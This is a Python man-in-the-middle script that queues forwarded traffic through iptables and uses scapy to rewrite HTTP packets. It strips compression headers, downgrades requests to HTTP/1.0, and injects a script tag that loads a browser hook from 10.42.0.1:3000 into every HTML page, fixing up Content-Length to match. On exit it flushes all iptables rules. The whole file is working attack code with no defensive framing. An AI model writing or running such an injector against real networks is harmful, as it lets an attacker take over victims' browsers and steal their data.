#!/usr/bin/env python
import argparse
import subprocess
import netfilterqueue
import re 
import scapy.all as scapy
from scapy.layers.inet import IP,TCP

HTTP11 = "HTTP/1.1"
HTTP10 = "HTTP/1.0"
PAGE_END_TAG = "</body>"
JS_HOOK = """ <script src="http://10.42.0.1:3000/hook.js"> alert("Hacking is Kool") </script>"""
TXT_HTML = "text/html"
SUPPORTED_ENCODING = "Accept-Encoding:.*?\\r\\n"
CONTENT_LENGTH = r"(?:Content-Length:\s)(\d*)"
NEW_SE= ""

ack_list = []

def set_load(pkt, load):
   pkt[scapy.Raw].load = load
   #to avoid pkt to be corupted
   del pkt[IP].len
   del pkt[IP].chksum
   del pkt[TCP].chksum
   return pkt


def process_pkt(pkt) :
   scapy_pkt = IP(pkt.get_payload())
   if scapy_pkt.haslayer(scapy.Raw) :   
      load = scapy_pkt[scapy.Raw].load   
      if scapy_pkt.haslayer(TCP) and scapy_pkt[TCP].dport == 80:
         #HTTP Request
         load = re.sub(SUPPORTED_ENCODING, NEW_SE, load) 
         load = load.replace(HTTP11,HTTP10)
            
      elif scapy_pkt.haslayer(TCP) and scapy_pkt[TCP].sport == 80:
         #HTTP Response
         load = load.replace(PAGE_END_TAG, JS_HOOK+PAGE_END_TAG)
         content_length = re.search(CONTENT_LENGTH, load)
         if content_length and TXT_HTML in load:
            clength = content_length.group(1)
            new_clength = int(clength) + len(JS_HOOK)
            load = load.replace(clength, str(new_clength))

      if (scapy_pkt[scapy.Raw].load != load) :
         print("[+] Adding the HOOK\n------------------------------------------")
         edited_pkt = set_load(scapy_pkt, load)
         pkt.set_payload(str(edited_pkt))

   pkt.accept()

try : 
   # put recieved packets in a queue Quenum=0
   subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0",shell=True)
   #subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0",shell=True)
   #subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0",shell=True)
   
   queue = netfilterqueue.NetfilterQueue()
   queue.bind(0, process_pkt)
   queue.run()

except KeyboardInterrupt:
   print("\n[-] Ctrl+C detected ....iptables flushed")
   #flush ip table to emmpty queue 0
   subprocess.call("iptables --flush",shell=True)
   print("[-] .....Quiting")
